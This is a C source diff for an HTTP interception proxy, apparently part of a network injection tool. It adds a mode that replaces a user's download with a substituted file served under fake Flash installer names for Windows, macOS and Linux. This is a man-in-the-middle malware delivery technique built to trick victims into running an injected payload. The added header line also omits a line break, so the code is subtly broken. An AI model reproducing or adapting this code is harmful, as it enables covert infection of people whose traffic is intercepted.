@@ -22,12 +22,12 @@
 
 /* protos */
 
-int proxy_replace(BIO **cbio, BIO **sbio, char *file, char *tag, char *host, char *ip, char *url);
+int proxy_replace(BIO **cbio, BIO **sbio, char *file, char *tag, int type, char *host, char *ip, char *url);
 int setup_replace_bio(BIO **fbio, char *file, char *search, char *replace, int *diff);
 
 /************************************************/
 
-int proxy_replace(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host, char *ip, char *url)
+int proxy_replace(BIO **cbio, BIO **sbio, char *file,  char *tag, int type, char *host, char *ip, char *url)
 {
    BIO *fbio, *fbio2;
    char data[READ_BUFF_SIZE];
@@ -129,11 +129,29 @@ int proxy_replace(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host, ch
    }
 
    /* prepare the HTTP header */
-   sprintf(data, "HTTP/1.0 200 OK\r\n"
-       "Content-Length: %u\r\n"
-       "%s" /* Content-Type: */
-       "Connection: close\r\n"
-       "\r\n", (u_int)content_length, content_type);
+   if (type == REQ_TYPE_INJECT_HTML_FLASH) {
+       char *thefile;
+
+       if (strstr(file, ".exe") != NULL)
+          thefile = "install_flash_player.exe";
+       else if (strstr(file, ".dmg") != NULL)
+          thefile = "install_flash_player_osx.dmg";
+       else
+          thefile = "flash-plugin-11.2.deb";
+
+       sprintf(data, "HTTP/1.0 200 OK\r\n"
+          "Content-Length: %u\r\n"
+          "%s" /* Content-Type: */
+          "Content-Disposition: attachment; filename=\"%s\""
+          "Connection: close\r\n"
+          "\r\n", (u_int)content_length, content_type, thefile);
+   } else {
+       sprintf(data, "HTTP/1.0 200 OK\r\n"
+          "Content-Length: %u\r\n"
+          "%s" /* Content-Type: */
+          "Connection: close\r\n"
+          "\r\n", (u_int)content_length, content_type);
+   }
 
    /* send the headers to the client, the data will be sent in the callee function */
    BIO_write(*cbio, data, strlen(data));
